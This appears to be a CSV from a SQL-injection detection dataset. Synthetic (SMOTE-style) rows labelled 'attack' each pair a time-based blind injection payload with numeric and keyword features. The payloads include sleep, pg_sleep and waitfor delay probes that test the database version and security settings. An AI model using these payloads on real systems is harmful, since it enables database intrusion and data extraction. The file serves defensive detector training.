id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000395,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.6715326515138687,45.56505149074419,16.0,2.77215648372926,11.0,0.0,23.710034327162795,10.855017163581397,0.2415492586460131,0.0,0.5202731765781738,0.23817756477581303,0.14498283641860343,1.7100343271627934,0.0,0.0,0.0,1.0,0.0,4.0,0.0,4.0,-5.551115123125783e-17,1.0,0.14498283641860338,0.8550171635813967,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000396,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,2.3563741874633624,33.22482518846075,16.0,3.213110996160494,11.0,0.0,13.379860150768597,8.844965037692148,0.33822009100524475,0.0,0.39413589079370637,0.26764401820104894,0.0,1.4224825188460746,0.0,0.0,0.0,0.4224825188460746,0.0,2.4224825188460746,0.0,4.0,-5.551115123125783e-17,0.4224825188460748,0.0,1.0,0.0,0.5775174811539255,0.0,0.4224825188460746,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000397,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.331770466640061,40.902596294981166,16.0,2.938062232021342,11.0,0.0,19.63079682426957,10.271799470711596,0.27038541848116343,0.0,0.47790097148096555,0.25171361003787096,0.0,2.0,0.0,0.0,0.0,1.0,0.0,3.2717994707115947,0.0,4.0,-5.551115123125783e-17,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000398,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.8419154397682196,28.41868760832263,15.709343804161314,3.356097060978702,11.0,0.0,9.709343804161314,7.709343804161315,0.3874769301512785,0.0,0.3414867103926588,0.2710363594560627,0.0,0.709343804161315,0.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,-5.551115123125783e-17,0.0,0.0,0.709343804161315,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000399,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,1.7548231763681366,41.38578967373756,16.67143542488523,3.104491083094102,12.342870849770467,1.0,18.028612549311397,10.014306274655699,0.3002705375693351,0.024584451193635583,0.4337070400289291,0.24143797120810018,0.0,0.0,1.3428708497704658,0.0,0.0,0.0,0.0,3.671435424885233,0.0,4.6714354248852334,-5.551115123125783e-17,1.342870849770466,0.0,0.0,0.6714354248852329,0.3285645751147671,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.32856457511476717,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.328564575114767
SMOTE_000400,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.2401555301113287,116.10089600058228,28.942017920011644,4.0099054751796075,59.492465920302784,3.9420179200116454,35.84035840023291,16.826053760034938,0.5122943354622472,0.03418542789904478,0.3071817680679786,0.14633846857072935,4.0,0.0,2.0,0.0,0.0,0.0,0.0,5.768071680046582,0.0,0.057982079988354585,1.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000401,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,2.470508478886654,30.88328762583463,16.470821906458657,3.4319106431445237,11.941643812917317,0.0,10.0,8.941643812917315,0.3861980216200848,0.0,0.32514850965690045,0.28865346872301473,0.0,1.0,0.9416438129173152,0.0,0.0,0.0,0.0,2.0,0.0,4.470821906458657,-5.551115123125783e-17,0.941643812917315,0.0,1.0,0.4708219064586576,0.5291780935413425,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5291780935413426,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5291780935413426
SMOTE_000402,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.9491908701122506,32.38704376427448,14.774184193695497,3.2574804134343522,11.516122795796997,0.2580613978984987,11.096736774781984,9.516122795796997,0.3660269499010291,0.005734697731077744,0.326676412364841,0.3015619400030521,0.0,0.0,2.0,0.0,0.0,0.0,0.0,2.5161227957969974,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2580613978984987,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2580613978984987
SMOTE_000403,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0025175004186942223,100.0,33.0,4.0695339432380715,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,0.0,2.0,0.0,0.0,0.0,1.0,6.0,0.0,0.0,1.9999999999999998,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000404,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.4420393615005905,40.15079042707368,15.735827203867668,3.105551770324027,12.735827203867668,0.0,16.679136019338344,10.735827203867668,0.32053100936265666,0.0,0.4097019431334049,0.26976704750393843,0.0,0.0,2.0,0.0,0.0,0.0,0.0,3.735827203867669,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8679136019338345,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8679136019338345
SMOTE_000405,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,1.3969869933400547,38.079390209329006,23.73015244766775,4.237869995825653,16.0,2.0,7.079390209329002,13.0,0.4210479608772156,0.05263099510965195,0.1842195758003949,0.3421014682127377,2.0,0.7301524476677497,2.0,0.0,0.0,0.0,0.7301524476677496,1.2698475523322506,0.0,4.0,0.2698475523322504,2.0,1.0,0.7301524476677496,1.0,0.0,0.0,0.0,1.0,0.7301524476677496,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000406,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.0065433984691924026,100.0,33.0,4.066767694186491,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,0.0,2.0,0.0,0.0,0.0,1.0,6.0,0.0,0.0,1.9999999999999998,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000407,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.5374475213165055,26.42346927733128,17.0,3.9298421750607595,12.423469277331282,4.576530722668718,3.0,6.423469277331282,0.4699837177815356,0.1736074820551713,0.1135749176182424,0.24283388254505078,2.4234692773312823,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-5.551115123125783e-17,2.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000408,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.03673369528613939,119.0,29.219943303879504,4.003094108867323,61.0,4.0,37.0,17.0,0.5126050420168067,0.03361344537815126,0.31092436974789917,0.14285714285714285,4.0,0.0,2.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000409,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.04200270098081294,44.8243064700383,16.94143549001277,3.073931182116173,13.0,0.941435490012767,19.882870980025533,11.0,0.29009736290449845,0.02092078866695038,0.4435148490478217,0.24546699938072947,0.0,0.0,2.0,0.0,0.0,0.0,0.0,4.0,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000410,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.35517045516671786,45.337566283168435,16.0,2.7848310121856263,11.0,0.0,23.484773775797674,10.852792507370763,0.24341173377505712,0.0,0.517155113331757,0.23943315289318587,0.07360374631461819,1.8527925073707636,0.0,0.0,0.0,1.0,0.0,3.9263962536853816,0.0,4.0,-5.551115123125783e-17,1.0,0.07360374631461836,0.9263962536853819,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000411,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.25442844006589255,34.22413103024107,17.0,3.4602471305793445,13.0,0.0,11.02010919186756,10.204021838373512,0.38322309535815896,0.0,0.3174560895819655,0.29932081505987557,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.204021838373512,0.0,5.0,-5.551115123125783e-17,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000412,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.05828970771354705,42.95059947115148,16.0,2.8040317653317195,11.0,0.0,21.950599471151474,10.0,0.2561379879650172,0.0,0.5110092957031491,0.23285271633183377,0.9876498677878687,0.02470026442426254,0.0,0.0,0.0,1.0,0.0,3.9876498677878685,0.0,4.0,-5.551115123125783e-17,1.0,0.9876498677878687,0.012350132212131382,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000413,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.0038727956943426832,100.0,33.0,4.065358066470585,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,0.0,2.0,0.0,0.0,0.0,1.0,6.0,0.0,0.0,1.9999999999999998,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000414,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.13545248057318987,99.39527978442004,32.902464481358074,4.0734460704636355,38.92197158508645,6.921971585086457,34.64887213288905,18.902464481358074,0.3922871372342412,0.06948263768372544,0.347978611715102,0.19025161336693136,2.039014207456771,0.0,2.0,0.0,0.0,0.0,0.9804928962716145,5.921971585086458,0.0,0.019507103728385378,1.9804928962716142,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.9804928962716145,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9804928962716144,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.980492896271614
SMOTE_000415,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0036795322938465943,100.0,33.0,4.068920586450496,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,0.0,2.0,0.0,0.0,0.0,1.0,6.0,0.0,0.0,1.9999999999999998,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000416,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.0044305959847901815,119.0,29.973471769970928,4.020538530327489,61.0,4.0,37.0,17.0,0.5126050420168067,0.03361344537815126,0.31092436974789917,0.14285714285714285,4.0,0.0,2.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000417,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.07033451667872488,119.0,29.57887150054436,4.011403409734265,61.0,4.0,37.0,17.0,0.5126050420168067,0.03361344537815126,0.31092436974789917,0.14285714285714285,4.0,0.0,2.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000418,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.47803175005740633,33.75343638842753,17.0,3.477761163819654,13.0,0.8493127223144932,10.602749110742028,9.301374555371014,0.38612864988073525,0.025736749161045243,0.31288385707353394,0.2752507438846855,0.0,0.15068727768550697,2.0,0.0,0.0,0.0,0.0,2.150687277685507,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.15068727768550694,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000419,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.15366105051882598,42.64275038873258,16.21425012957753,3.0729940524154586,13.0,0.21425012957752676,18.428500259155054,11.0,0.3051027751039558,0.004761113990611708,0.43197222427900833,0.25816388662642414,0.0,0.0,2.0,0.0,0.0,0.0,0.0,4.0,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000420,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,2.4668188985916095,33.42284535010969,16.0,3.2058671439455626,11.0,0.0,13.538276280087752,8.884569070021938,0.3362941654719659,0.0,0.396447001433641,0.26725883309439313,0.0,1.442284535010969,0.0,0.0,0.0,0.4422845350109691,0.0,2.4422845350109688,0.0,4.0,-5.551115123125783e-17,0.442284535010969,0.0,1.0,0.0,0.557715464989031,0.0,0.4422845350109691,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000421,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.38267257934858945,34.6699908323039,17.0,3.4456910817946813,13.0,0.0,11.335992665843122,10.33399816646078,0.3766268892982849,0.0,0.3248706935006252,0.29850241720108994,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.3339981664607805,0.0,5.0,-5.551115123125783e-17,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000422,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.10709689113798457,42.11141396114269,16.03713798704756,3.0727658065538774,13.0,0.0,18.074275974095123,11.037137987047563,0.3087574701085424,0.0,0.42916092042932635,0.26208160946213127,0.0,0.03713798704756249,2.0,0.0,0.0,0.0,0.0,4.0,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.03713798704756255,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000423,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,0.6013870400355349,36.76126204125742,23.88063102062871,4.301337843016508,16.0,2.0,5.880631020628709,12.880631020628709,0.435382090609947,0.05442276132624337,0.1598577417109789,0.3503374063528307,2.0,0.8806310206287085,2.0,0.0,0.0,0.0,0.8806310206287083,1.0000000000000002,0.0,4.0,0.11936897937129165,2.0,1.0,0.8806310206287083,1.0,0.0,0.0,0.0,1.0,0.8806310206287083,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000424,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,1.2485759501408265,41.941831848812136,16.0,2.8545430095559046,11.0,0.0,20.941831848812136,10.0,0.26275482985275284,0.0,0.498377143008381,0.2388680271388662,0.7354579622030337,0.5290840755939326,0.0,0.0,0.0,1.0,0.0,3.735457962203034,0.0,4.0,-5.551115123125783e-17,1.0,0.7354579622030337,0.2645420377969663,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000425,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,1.473402040354883,101.21341917063671,28.644268383412737,4.071030384653008,51.75097796873109,3.6442683834127343,29.885367668254688,15.932805150238202,0.5106987953806065,0.037122672140247046,0.28796276253912423,0.16421576994002218,4.0,0.0,2.0,0.0,0.0,0.0,0.0,4.577073533650937,0.0,0.3557316165872657,1.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000426,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.3894192418187656,115.22168955372891,28.845783247090974,4.016646038360734,59.149398965091706,4.0,35.38072409445524,16.69156649418195,0.5138361841618787,0.035427760118257434,0.30457426815752753,0.14616178756233625,4.0,0.0,2.0,0.0,0.0,0.0,0.0,5.69156649418195,0.0,0.0771083764545124,1.0,3.9228916235454876,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.9228916235454876,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9228916235454876
SMOTE_000427,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,1.795773120752729,37.424922104483095,16.0,3.0226013262467886,11.0,0.0,17.262438796379573,9.162483308103521,0.30321050057791166,0.0,0.45100139546594165,0.24578810395614667,0.6125055639654933,0.7749888720690135,0.0,0.0,0.0,1.0,0.0,2.7749888720690135,0.0,4.0,-5.551115123125783e-17,1.0,0.6125055639654933,0.3874944360345068,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
